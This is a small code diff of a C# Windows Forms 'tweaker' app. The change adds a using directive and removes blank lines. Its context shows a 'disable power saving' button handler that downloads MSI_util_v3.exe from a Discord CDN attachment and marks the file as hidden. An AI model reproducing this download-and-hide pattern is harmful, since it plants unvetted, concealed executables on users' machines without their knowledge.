@@ -7,6 +7,7 @@ using System.Drawing;
 using System.Linq;
 using System.Net;
 using System.Text;
+using System.Net.Http;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -21,8 +22,6 @@ namespace LeXarTweaker
 
         private void DisablePowersaving_Click(object sender, EventArgs e)
         {
-
-
             WebClient webClient = new WebClient();
             webClient.DownloadFile("https://cdn.discordapp.com/attachments/977950699650441277/979097250464694292/MSI_util_v3.exe", "MSI_util_v3.exe");
             File.SetAttributes(@"MSI_util_v3.exe", File.GetAttributes(@"MSI_util_v3.exe") | FileAttributes.Hidden);
